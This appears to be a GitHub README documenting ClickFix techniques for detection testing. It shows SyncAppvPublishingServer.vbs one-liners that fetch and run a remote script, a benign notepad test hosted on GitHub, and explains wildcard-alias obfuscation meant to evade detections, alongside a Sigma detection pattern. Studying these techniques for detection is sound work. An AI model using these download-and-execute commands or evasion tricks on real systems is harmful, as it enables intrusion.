# ClickFix-Techniques
Techniques for ClickFix to test with. The goal is to perform testing that will help detections.

## SyncAppvPublishingServer.vbs
Adversaries have been found to use SyncAppvPublishingServer.vbs as an [alternative to PowerShell or MSHTA.](https://expel.com/blog/clearfake-new-lotl-techniques/)

This [living off the land](https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/) script located at _C:\Windows\System32\SyncAppvPublishingServer.vbs_ is related to app-v and publishing server. SyncAppvPublishingServer.vbs [calls PowerShell "silently"](https://expel.com/blog/clearfake-new-lotl-techniques/)
<img width="957" height="228" alt="image" src="https://github.com/user-attachments/assets/758c6ae7-2af2-4a57-8e2e-a25b02b5d1f3" />


**Usage:**  
    The following will use SyncAppvPublishingServer.vbs to execute a command of _notepad.exe_ hosted on MY Github.  
```
SyncAppvPublishingServer.vbs "n;(Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/villaroot/villaroot-test/refs/heads/main/testNotepad.bat'))"
```

**Detect:**  
Look for the following in the [command line](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml)  
```
- '\SyncAppvPublishingServer.vbs'
- ';'
```

Process Tree when using Win + R to execute the command given above in _Usage_:   
<img width="297" height="69" alt="image" src="https://github.com/user-attachments/assets/f5981a3d-72c9-42ed-9a05-d4f0045164a6" />


## Obfuscation
Wild cards and Powershell Aliases [are being used](https://expel.com/blog/clearfake-new-lotl-techniques/) to obfuscate Powershell Commands. Breaking down the following command:  
```
SyncAppvPublishingServer.vbs “n;&(gal i*x)(&(gcm *stM*) ‘https://raw.githubusercontent.com/villaroot/villaroot-test/refs/heads/main/testNotepad.bat’)”
```
1. To thrown off detections such as ^iex that look for the start of commands starting with iex , this command begins with dummy text of
    ```
    n;
    ```
2. To get around string matches of common PowerShell  commands such as _Invoke-Expression, iex, Invoke-RestMethod_, wildcards are used to store the PowerShell commands:
    
    **I**nvoke-**E**xpression  
    ```
    gal i*x
    
    gal -> Get-Alias
    i*x -> Invoke-Expression
    ```
    <img width="304" height="88" alt="image" src="https://github.com/user-attachments/assets/51c635bf-5581-4fc3-89b4-50c7d2f51ef4" />
  
    Invoke-Re**stM**ethod
    ```
    gcm *stM*
    gcm -> Get-Cmdlet
    *stM* -> Invoke-RestMethod
    ```
    <img width="252" height="81" alt="image" src="https://github.com/user-attachments/assets/b093f93f-096f-4f89-8515-e7b2f26f85f3" />

3. As these will store the value as variables in PowerShell, to execute them as commands Powershell can use _&_ to know when to execute. Example, this will execute Invoke-Expression
    ```
    $t=Invoke-Expression
    & $t notepad.exe
    ```
    If _&_ was not used in this case, you will recieve an error:  
    <img width="594" height="207" alt="image" src="https://github.com/user-attachments/assets/bcd4129a-cff9-4894-b939-66cf1a4e259a" />
    



